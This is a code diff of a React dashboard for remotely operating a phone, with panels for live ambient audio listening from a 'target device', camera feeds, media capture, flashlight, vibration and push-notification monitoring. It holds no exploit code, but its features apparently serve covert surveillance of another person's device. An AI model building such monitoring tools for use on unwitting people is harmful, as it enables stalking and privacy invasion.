-                                            {isLiveAudio ? <Square size={18} /> : <Play size={18} />}
-                                            {isLiveAudio ? 'Stop Live Listening' : 'Live Listen'}
-                                        </button>
-                                        <button 
-                                            onClick={isVoiceRecording ? stopVoiceRecording : startVoiceRecording}
-                                            className={`btn-secondary py-3 px-6 rounded-xl ${isVoiceRecording ? 'text-red-400 border-red-400/50 hover:bg-red-500/10' : ''}`}
-                                        >
-                                            {isVoiceRecording ? <Square size={18} /> : <Mic size={18} />}
-                                            {isVoiceRecording ? 'Stop Recording' : 'Record Voice'}
-                                        </button>
-                                    </>
-                                )}
+                                    </div>
+                                    {isLiveStreaming && (
+                                        <div className="absolute top-4 right-4 flex items-center gap-2 bg-black/60 backdrop-blur-xl px-3 py-1.5 rounded-full border border-white/10 shadow-lg">
+                                            <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
+                                            <span className="text-xs font-bold text-white tracking-widest font-data">LIVE</span>
+                                        </div>
+                                    )}
+                                </div>
+                                <div className="flex items-center gap-4 bg-white/5 p-4 rounded-2xl border border-white/10">
+                                    <label className="text-sm font-medium text-white/60">Recording Duration (s):</label>
+                                    <input type="number" min="5" max="300" value={recordingDuration} onChange={(e) => setRecordingDuration(Number(e.target.value))} className="bg-black/50 border border-white/10 rounded-lg px-3 py-1.5 w-24 text-center focus:outline-none focus:border-cyan-500" />
+                                </div>
                             </div>
                             
-                            {isLiveAudio && (
-                                <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="mt-8 p-6 rounded-2xl bg-black/40 border border-white/5 flex flex-col items-center gap-4 relative z-10 w-full">
-                                    <div className="flex items-center gap-2 bg-red-500/10 px-3 py-1 rounded-full border border-red-500/20">
-                                        <div className="w-2.5 h-2.5 rounded-full bg-red-500 animate-pulse shadow-[0_0_12px_rgba(239,68,68,0.8)]" />
-                                        <span className="text-xs font-bold text-red-400 font-data tracking-wider uppercase">Live • {formatTime(audioElapsed)}</span>
+                            {/* Side Panel: Recent Captures / Gallery Preview */}
+                            <div className="bg-white/5 border border-white/10 rounded-3xl p-6 flex flex-col h-[400px] lg:h-auto">
+                                <div className="flex items-center justify-between mb-4">
+                                    <h3 className="font-bold text-sm text-white/80">Recent Media</h3>
+                                    <button onClick={() => setSelectedTool('gallery')} className="text-xs text-cyan-400 hover:text-cyan-300 font-medium">Open Gallery &rarr;</button>
+                                </div>
+                                <div className="flex-1 overflow-y-auto custom-scrollbar flex flex-col gap-3 pr-2">
+                                    {filteredImages.slice(0, 6).map((img: any) => (
+                                        <div key={img.id} className="relative aspect-video rounded-xl overflow-hidden group cursor-pointer flex-shrink-0" onClick={() => { setSelectedTool('gallery'); setActiveTab('all'); }}>
+                                            {img.resource_type === 'video' ? (
+                                                <video src={img.url} className="w-full h-full object-cover" />
+                                            ) : (
+                                                <img src={img.url} alt="Recent" className="w-full h-full object-cover" />
+                                            )}
+                                            <div className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
+                                                <span className="text-xs font-bold text-white bg-black/50 px-3 py-1.5 rounded-full backdrop-blur-md">View</span>
+                                            </div>
+                                        </div>
+                                    ))}
+                                    {filteredImages.length === 0 && (
+                                        <div className="flex-1 flex flex-col items-center justify-center text-white/30 text-center gap-2 p-4 min-h-[200px]">
+                                            <ImageIcon size={32} strokeWidth={1.5} />
+                                            <p className="text-xs">No recent media. Captures will appear here or in the Gallery.</p>
+                                        </div>
+                                    )}
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                );
+            case 'audio':
+                return (
+                    <div className="space-y-6 animate-in fade-in zoom-in-95 duration-300">
+                        <div>
+                            <h2 className="text-2xl font-bold tracking-tight flex items-center gap-2">
+                                <Mic className="text-purple-400" /> Audio Monitoring
+                            </h2>
+                            <p className="text-sm text-white/40">Live listen or record ambient audio from the device.</p>
+                        </div>
+                        
+                        <div className="max-w-3xl mx-auto bg-white/5 border border-white/10 rounded-3xl p-8 sm:p-16 text-center relative overflow-hidden shadow-neo-2xl">
+                            <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-purple-500/10 blur-[100px] rounded-full pointer-events-none" />
+                            
+                            <div className="relative z-10 flex flex-col items-center gap-10">
+                                <div className="relative">
+                                    {isLiveAudio && (
+                                        <>
+                                            <div className="absolute inset-[-40px] rounded-full border border-purple-500/20 animate-[ping_2s_ease-out_infinite]" />
+                                            <div className="absolute inset-[-20px] rounded-full border border-purple-500/40 animate-[ping_1.5s_ease-out_infinite]" />
+                                        </>
+                                    )}
+                                    <div className={`w-36 h-36 rounded-full flex items-center justify-center shadow-2xl transition-all duration-500 ${isLiveAudio ? 'bg-purple-500/20 text-purple-400 border-2 border-purple-500/50 shadow-[0_0_50px_rgba(168,85,247,0.3)]' : 'bg-white/5 text-white/30 border border-white/10 hover:bg-white/10 hover:text-white/60 cursor-pointer'}`} onClick={isLiveAudio ? stopLiveAudio : startLiveAudio}>
+                                        <Mic size={56} strokeWidth={isLiveAudio ? 2 : 1.5} />
                                     </div>
-                                    <div className="flex items-center justify-center gap-1.5 h-16 w-full px-4">
-                                        {Array.from({length: 24}).map((_, i) => (
-                                            <div 
-                                                key={i} 
-                                                className="w-1.5 bg-amber-400 rounded-full transition-all duration-75"
-                                                style={{ height: `${Math.max(15, audioLevel * 100 * Math.random())}%`, opacity: Math.max(0.3, audioLevel * Math.random() * 2) }}
-                                            />
-                                        ))}
-                                    </div>
-                                </motion.div>
-                            )}
+                                </div>
 
-                            {isCam && isLiveStreaming && liveFrame && (
-                                <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="mt-8 rounded-2xl overflow-hidden border border-white/10 aspect-[3/4] sm:aspect-video relative bg-black shadow-2xl relative z-10 w-full">
-                                    <img src={`data:image/jpeg;base64,${liveFrame}`} className="w-full h-full object-contain" alt="Live Feed" />
-                                    <div className="absolute top-4 right-4 flex items-center gap-2 bg-black/60 backdrop-blur-xl px-3 py-1.5 rounded-full border border-white/10 shadow-lg">
-                                        <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
-                                        <span className="text-xs font-bold text-white tracking-widest font-data">LIVE</span>
-                                    </div>
-                                </motion.div>
-                            )}
+                                <div>
+                                    <h3 className="text-2xl font-bold mb-3">{isLiveAudio ? 'Live Stream Active' : 'Microphone Standby'}</h3>
+                                    <p className="text-sm text-white/50 max-w-sm mx-auto leading-relaxed">
+                                        {isLiveAudio 
+                                            ? 'Streaming real-time, low-latency audio directly from the device microphone to your browser.' 
+                                            : 'Click to start a secure, low-latency live audio stream from the target device.'}
+                                    </p>
+                                    {isLiveAudio && (
+                                        <div className="flex items-center justify-center gap-1.5 h-12 w-full mt-6 px-4">
+                                            {Array.from({length: 24}).map((_, i) => (
+                                                <div 
+                                                    key={i} 
+                                                    className="w-1.5 bg-purple-400 rounded-full transition-all duration-75"
+                                                    style={{ height: `${Math.max(15, audioLevel * 100 * Math.random())}%`, opacity: Math.max(0.3, audioLevel * Math.random() * 2) }}
+                                                />
+                                            ))}
+                                        </div>
+                                    )}
+                                </div>
+
+                                <button 
+                                    onClick={isLiveAudio ? stopLiveAudio : startLiveAudio}
+                                    className={`py-4 px-10 rounded-full font-bold text-sm tracking-widest transition-all ${isLiveAudio ? 'bg-red-500 hover:bg-red-600 text-white shadow-[0_0_30px_rgba(239,68,68,0.4)] hover:shadow-[0_0_40px_rgba(239,68,68,0.6)]' : 'bg-purple-500 hover:bg-purple-600 text-white shadow-[0_0_30px_rgba(168,85,247,0.4)] hover:shadow-[0_0_40px_rgba(168,85,247,0.6)]'}`}
+                                >
+                                    {isLiveAudio ? 'STOP STREAM' : 'START LIVE AUDIO'}
+                                </button>
+                            </div>
                         </div>
                     </div>
                 );
             case 'torch':
-            case 'vibration':
-                const isTorch = selectedTool === 'torch';
                 return (
-                    <div className="flex flex-col items-center justify-center min-h-[60vh]">
-                        <div className="max-w-md w-full bezel bezel-inner rounded-[2.5rem] p-12 text-center space-y-12 relative overflow-hidden">
-                            <div className={`absolute top-0 left-0 w-full h-full bg-gradient-to-br from-white/5 to-transparent pointer-events-none transition-opacity duration-500 ${isTorch && isTorchOn ? 'opacity-0' : 'opacity-100'}`} />
-                            {isTorch && isTorchOn && <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full bg-yellow-400/20 blur-[100px] pointer-events-none" />}
+                    <div className="flex flex-col items-center justify-center min-h-[60vh] animate-in fade-in zoom-in-95 duration-300">
+                        <div className="max-w-md w-full bg-white/5 border border-white/10 rounded-[3rem] p-12 text-center space-y-12 relative overflow-hidden shadow-neo-2xl">
+                            <div className={`absolute inset-0 bg-gradient-to-b from-yellow-500/10 to-transparent pointer-events-none transition-opacity duration-700 ${isTorchOn ? 'opacity-100' : 'opacity-0'}`} />
+                            {isTorchOn && (
+                                <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full h-full bg-yellow-400/20 blur-[120px] pointer-events-none animate-pulse" />
+                            )}
                             
-                            <div className="space-y-3 relative z-10">
-                                <h2 className="text-3xl font-bold tracking-tight">{isTorch ? 'Flashlight' : 'Vibration'}</h2>
-                                <p className="text-white/40 text-sm">Toggle the device's {isTorch ? 'flash LED' : 'haptic motor'} remotely.</p>
+                            <div className="space-y-4 relative z-10">
+                                <h2 className="text-4xl font-bold tracking-tight text-white">Flashlight</h2>
+                                <p className="text-white/50 text-sm max-w-xs mx-auto">Toggle the device's rear camera LED flash remotely.</p>
                             </div>
                             
                             <button 
-                                onClick={isTorch ? toggleTorch : triggerVibration}
-                                className={`relative w-48 h-48 mx-auto rounded-full flex items-center justify-center transition-all duration-500 ease-[cubic-bezier(0.34,1.56,0.64,1)] group z-10 ${
-                                    isTorch && isTorchOn 
-                                        ? 'bg-yellow-400 shadow-[0_0_80px_rgba(250,204,21,0.6),inset_0_-8px_20px_rgba(0,0,0,0.2)] scale-105' 
-                                        : 'bg-gradient-to-b from-white/10 to-white/5 border border-white/10 shadow-[0_20px_40px_rgba(0,0,0,0.4),inset_0_1px_1px_rgba(255,255,255,0.2)] hover:scale-105'
+                                onClick={toggleTorch}
+                                className={`relative w-56 h-56 mx-auto rounded-full flex items-center justify-center transition-all duration-500 ease-[cubic-bezier(0.34,1.56,0.64,1)] group z-10 ${
+                                    isTorchOn 
+                                        ? 'bg-yellow-400 shadow-[0_0_100px_rgba(250,204,21,0.6),inset_0_-10px_20px_rgba(0,0,0,0.2)] scale-105 border-4 border-yellow-200' 
+                                        : 'bg-black/40 border border-white/10 shadow-[0_20px_40px_rgba(0,0,0,0.6),inset_0_2px_4px_rgba(255,255,255,0.1)] hover:scale-105 hover:bg-black/60'
                                 }`}
                             >
-                                <div className={`absolute inset-2 rounded-full border transition-colors duration-500 ${isTorch && isTorchOn ? 'border-yellow-300/50' : 'border-white/5 group-hover:border-white/10'}`} />
-                                {isTorch ? (
-                                    <Flashlight size={64} className={`transition-colors duration-500 ${isTorchOn ? 'text-yellow-900 drop-shadow-md' : 'text-yellow-400/80 group-hover:text-yellow-400'}`} />
-                                ) : (
-                                    <Vibrate size={64} className="text-orange-400/80 group-hover:text-orange-400 transition-colors" />
-                                )}
+                                <div className={`absolute inset-4 rounded-full border transition-colors duration-500 ${isTorchOn ? 'border-yellow-300/50' : 'border-white/5 group-hover:border-white/10'}`} />
+                                <Flashlight size={72} className={`transition-colors duration-500 ${isTorchOn ? 'text-yellow-900 drop-shadow-md' : 'text-white/20 group-hover:text-yellow-400/50'}`} strokeWidth={1.5} />
                             </button>
+                            
+                            <div className="relative z-10 pt-8 border-t border-white/10 flex items-center justify-between">
+                                <span className="text-sm font-medium text-white/40 uppercase tracking-widest">{isTorchOn ? 'Status: ON' : 'Status: OFF'}</span>
+                                <div className={`w-3 h-3 rounded-full shadow-lg ${isTorchOn ? 'bg-yellow-400 shadow-yellow-400/50' : 'bg-white/10'}`} />
+                            </div>
+                        </div>
+                    </div>
+                );
+            case 'vibration':
+                return (
+                    <div className="flex flex-col items-center justify-center min-h-[60vh] animate-in fade-in zoom-in-95 duration-300">
+                        <div className="max-w-md w-full bg-white/5 border border-white/10 rounded-[3rem] p-12 text-center space-y-12 relative overflow-hidden shadow-neo-2xl">
+                            <div className="absolute inset-0 bg-gradient-to-b from-orange-500/5 to-transparent pointer-events-none" />
+                            
+                            <div className="space-y-4 relative z-10">
+                                <h2 className="text-4xl font-bold tracking-tight text-white">Vibration</h2>
+                                <p className="text-white/50 text-sm max-w-xs mx-auto">Trigger the device's haptic motor to send an alert or locate the device.</p>
+                            </div>
+                            
+                            <button 
+                                onClick={triggerVibration}
+                                className="relative w-56 h-56 mx-auto rounded-full flex items-center justify-center transition-all duration-300 group z-10 bg-black/40 border border-white/10 shadow-[0_20px_40px_rgba(0,0,0,0.6),inset_0_2px_4px_rgba(255,255,255,0.1)] hover:bg-orange-500/10 hover:border-orange-500/30 active:scale-95"
+                            >
+                                <div className="absolute inset-0 rounded-full border border-orange-500/0 group-hover:border-orange-500/20 group-active:animate-[ping_0.5s_cubic-bezier(0,0,0.2,1)_1]" />
+                                <div className="absolute inset-4 rounded-full border border-white/5 group-hover:border-orange-500/30 transition-colors duration-300" />
+                                <Vibrate size={72} className="text-white/20 group-hover:text-orange-400 group-hover:animate-bounce transition-colors" strokeWidth={1.5} />
+                            </button>
+                            
+                            <div className="relative z-10 pt-8 border-t border-white/10 flex flex-col items-center gap-4">
+                                <label className="text-sm font-medium text-white/40 uppercase tracking-widest">Duration (ms)</label>
+                                <div className="flex items-center gap-4 w-full px-4">
+                                    <input 
+                                        type="range" 
+                                        min="100" 
+                                        max="5000" 
+                                        step="100" 
+                                        value={vibrationDuration} 
+                                        onChange={(e) => setVibrationDuration(Number(e.target.value))}
+                                        className="w-full accent-orange-500"
+                                    />
+                                    <span className="text-white font-data text-sm bg-black/40 px-3 py-1 rounded-lg border border-white/10">{vibrationDuration}ms</span>
+                                </div>
+                            </div>
                         </div>
                     </div>
                 );
             case 'notifications':
                 return (
-                    <div className="space-y-6 h-full flex flex-col">
-                        <div className="flex flex-col sm:flex-row sm:items-center justify-between flex-shrink-0 gap-4">
-                            <div>
-                                <h2 className="text-2xl font-bold tracking-tight">Alerts & Notifications</h2>
-                                <p className="text-sm text-white/40">Monitor device push notifications.</p>
+                    <div className="space-y-6 h-full flex flex-col animate-in fade-in zoom-in-95 duration-300">
+                        <div className="flex flex-col sm:flex-row sm:items-center justify-between flex-shrink-0 gap-4 bg-white/5 p-6 rounded-3xl border border-white/10 shadow-neo-xl">
+                            <div className="flex items-center gap-4">
+                                <div className="w-14 h-14 rounded-2xl bg-indigo-500/10 flex items-center justify-center border border-indigo-500/20 shadow-[0_0_20px_rgba(99,102,241,0.15)] relative">
+                                    <Bell size={28} className="text-indigo-400" />
+                                    {isMonitoringNotifications && (
+                                        <div className="absolute top-2 right-2 w-2.5 h-2.5 rounded-full bg-red-500 border-2 border-[#18181b]" />
+                                    )}
+                                </div>
+                                <div>
+                                    <h2 className="text-2xl font-bold tracking-tight">Alerts & Notifications</h2>
+                                    <p className="text-sm text-white/40">Monitor live device push notifications</p>
+                                </div>
                             </div>
-                            <div className="flex items-center gap-3 bg-white/5 px-4 py-2.5 rounded-xl border border-white/10">
-                                <span className="text-sm font-medium text-white/80">Monitoring</span>
+                            <div className="flex items-center gap-4 bg-black/40 px-5 py-3 rounded-2xl border border-white/5">
+                                <div className="flex flex-col">
+                                    <span className="text-xs font-bold text-white/40 uppercase tracking-widest">Status</span>
+                                    <span className={`text-sm font-semibold ${isMonitoringNotifications ? 'text-emerald-400' : 'text-white/60'}`}>{isMonitoringNotifications ? 'Monitoring Active' : 'Paused'}</span>
+                                </div>
+                                <div className="w-px h-8 bg-white/10 mx-2" />
                                 <button 
                                     onClick={() => socket?.emit('toggle_notification_monitor', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, enable: !isMonitoringNotifications })}
-                                    className={`relative w-12 h-6 rounded-full transition-colors duration-300 ${isMonitoringNotifications ? 'bg-cyan-500' : 'bg-white/20'}`}
+                                    className={`relative w-14 h-8 rounded-full transition-colors duration-300 shadow-inner ${isMonitoringNotifications ? 'bg-emerald-500 shadow-[inset_0_2px_4px_rgba(0,0,0,0.4)]' : 'bg-white/10 border border-white/10'}`}
                                 >
-                                    <div className={`absolute top-1 left-1 w-4 h-4 rounded-full bg-white transition-transform duration-300 shadow-sm ${isMonitoringNotifications ? 'translate-x-6' : 'translate-x-0'}`} />
+                                    <div className={`absolute top-1 left-1 w-6 h-6 rounded-full bg-white transition-transform duration-300 shadow-md ${isMonitoringNotifications ? 'translate-x-6' : 'translate-x-0'}`} />
                                 </button>
                             </div>
                         </div>
-                        <div className="flex gap-2 overflow-x-auto scrollbar-hide pb-2 flex-shrink-0">
+
+                        <div className="flex gap-2 overflow-x-auto custom-scrollbar pb-2 flex-shrink-0 px-1">
                             {notifAppFilters.map(filter => (
                                 <button
                                     key={filter.key}
                                     onClick={() => setSelectedNotifApp(filter.key)}
-                                    className={`px-5 py-2 rounded-full text-sm font-medium whitespace-nowrap transition-all border ${
+                                    className={`px-6 py-2.5 rounded-xl text-sm font-bold whitespace-nowrap transition-all border ${
                                         selectedNotifApp === filter.key 
-                                            ? 'bg-cyan-500/10 border-cyan-500/30 text-cyan-400 shadow-sm' 
+                                            ? 'bg-indigo-500 text-white border-indigo-400 shadow-[0_0_15px_rgba(99,102,241,0.4)]' 
                                             : 'bg-white/5 border-white/5 text-white/50 hover:bg-white/10 hover:text-white'
                                     }`}
                                 >
@@ -1730,27 +1956,44 @@ END:VCARD`;
                                 </button>
                             ))}
                         </div>
-                        <div className="flex-1 overflow-y-auto space-y-3 scrollbar-hide">
+
+                        <div className="flex-1 overflow-y-auto space-y-4 custom-scrollbar p-2">
                             {notifications.filter(n => selectedNotifApp === 'all' || notifAppFilters.find(f => f.key === selectedNotifApp)?.packages.includes(n.packageName)).length === 0 ? (
-                                <div className="h-[40vh] flex flex-col items-center justify-center text-center space-y-4">
-                                    <div className="w-16 h-16 rounded-2xl bg-white/5 flex items-center justify-center border border-white/5">
-                                        <Bell size={24} className="text-white/20" />
+                                <div className="h-full min-h-[40vh] flex flex-col items-center justify-center text-center space-y-6">
+                                    <div className="relative">
+                                        <div className="w-24 h-24 rounded-[2rem] bg-white/5 flex items-center justify-center border border-white/5 shadow-neo-xl">
+                                            <Bell size={40} className="text-white/20" strokeWidth={1} />
+                                        </div>
+                                        {isMonitoringNotifications && (
+                                            <div className="absolute -top-2 -right-2 w-6 h-6 rounded-full bg-emerald-500 flex items-center justify-center shadow-[0_0_15px_#10b981] animate-bounce">
+                                                <div className="w-2 h-2 bg-white rounded-full" />
+                                            </div>
+                                        )}
                                     </div>
-                                    <div className="text-white/40 font-medium text-sm">No notifications recorded yet.<br/>Ensure monitoring is active and the device is online.</div>
+                                    <div className="space-y-1">
+                                        <h3 className="text-lg font-bold text-white/80">No Notifications</h3>
+                                        <p className="text-white/40 text-sm max-w-xs mx-auto leading-relaxed">
+                                            {isMonitoringNotifications 
+                                                ? "Monitoring is active. Waiting for new alerts from the device..." 
+                                                : "Enable monitoring to start capturing live push notifications."}
+                                        </p>
+                                    </div>
                                 </div>
                             ) : (
                                 notifications.filter(n => selectedNotifApp === 'all' || notifAppFilters.find(f => f.key === selectedNotifApp)?.packages.includes(n.packageName)).map((notif: any, i: number) => (
-                                    <div key={i} className="p-5 rounded-2xl bg-white/5 border border-white/5 hover:border-white/10 hover:bg-white/[0.07] transition-colors flex flex-col sm:flex-row gap-4 sm:items-start">
-                                        <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-cyan-500/20 to-blue-500/20 border border-cyan-500/10 flex items-center justify-center flex-shrink-0">
-                                            <Bell size={18} className="text-cyan-400" />
+                                    <div key={i} className="p-6 rounded-3xl bg-white/5 border border-white/10 hover:border-indigo-500/30 hover:bg-white/[0.07] transition-all flex flex-col sm:flex-row gap-5 sm:items-start group hover:shadow-neo-lg">
+                                        <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-indigo-500/20 to-purple-500/20 border border-indigo-500/20 flex items-center justify-center flex-shrink-0 shadow-inner group-hover:scale-110 transition-transform">
+                                            <Bell size={20} className="text-indigo-400" />
                                         </div>
-                                        <div className="flex-1 min-w-0">
-                                            <div className="flex flex-col sm:flex-row sm:items-center justify-between mb-1 gap-1">
-                                                <span className="font-semibold text-sm text-cyan-400">{notif.appName || notif.packageName}</span>
-                                                <span className="text-xs text-white/40 font-data">{new Date(notif.receivedAt || notif.timestamp).toLocaleString()}</span>
+                                        <div className="flex-1 min-w-0 pt-1">
+                                            <div className="flex flex-col sm:flex-row sm:items-center justify-between mb-2 gap-2">
+                                                <span className="font-bold text-xs uppercase tracking-widest text-indigo-400 bg-indigo-500/10 px-3 py-1 rounded-lg border border-indigo-500/20">{notif.appName || notif.packageName}</span>
+                                                <span className="text-xs text-white/40 font-data bg-black/40 px-3 py-1 rounded-lg">{new Date(notif.receivedAt || notif.timestamp).toLocaleString()}</span>
                                             </div>
-                                            <h4 className="font-medium text-white/90 mb-1 text-base">{notif.title}</h4>
-                                            <p className="text-sm text-white/60 leading-relaxed">{notif.text}</p>
+                                            <h4 className="font-bold text-white/90 mb-2 text-lg">{notif.title}</h4>
+                                            <div className="bg-black/30 p-4 rounded-2xl border border-white/5">
+                                                <p className="text-sm text-white/70 leading-relaxed whitespace-pre-wrap">{notif.text}</p>
+                                            </div>
                                         </div>
                                     </div>
                                 ))
@@ -1772,10 +2015,11 @@ END:VCARD`;
                 setSelectedDeviceId={setSelectedDeviceId}
                 selectedTool={selectedTool}
                 setSelectedTool={setSelectedTool as any}
-                userPlan={userPlan}
+                userPlan={userPlan as any}
                 setShowPlansModal={setShowPlansModal}
-                handleSignOut={() => signOut()}
+                handleSignOut={handleSignOut}
                 onOpenAppModal={() => setShowAppModal(true)}
+                onDeleteDevice={handleDeleteDevice}
             />
 
             {/* Main Content Area */}
